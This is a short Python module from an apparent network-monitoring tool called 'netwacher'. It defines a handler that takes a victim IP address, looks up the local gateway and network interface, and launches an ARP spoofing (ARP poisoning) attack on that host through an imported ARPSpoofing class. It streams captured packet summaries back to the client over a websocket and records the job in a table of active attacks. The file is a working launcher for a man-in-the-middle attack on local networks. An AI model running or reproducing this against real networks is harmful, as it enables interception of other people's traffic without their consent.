from netwacher.socket_handlers import send_ws_tes
from netwacher.thirdparty.scapy_a import ARPSpoofing
from netwacher.models.client import Info
import time
import uuid

info = Info()
ACTIVE_SCANS: dict[str, ARPSpoofing] = {}

def arp_attck(payload: dict):
    if not payload or "ip" not in payload:
        return None

    ip = payload["ip"]
    client_id = payload.get("client_id")
    
    job_id = payload.get("job_id") or str(uuid.uuid4())
    
    room = client_id
    
    send_ws_tes("arp_attack", {"status": f"Arp Poison for {ip}", "job": job_id}, "arp-attack",room=room)
    
    def on_packet_callback(summary: str):
        send_ws_tes(
            "scan_status",
            {"summary": summary, "job": job_id},
            "arp-attack",
            room=room
        )
    
    ip_gateway = info.get_ip_gateway()
    interface = info.get_active_interface()
    
    spoofer = ARPSpoofing(
        target_ip=ip,    # IP korban
        gateway_ip=ip_gateway,     # IP router
        iface=interface,
        on_packet=on_packet_callback # Interface network
    )
    
    arp = spoofer.start()
    
    ACTIVE_SCANS[job_id] = {
        "arp_spoof": spoofer,
        "thread": arp,
        "client_id": client_id,
        "ip": ip
    }
    
    
    return True
    
    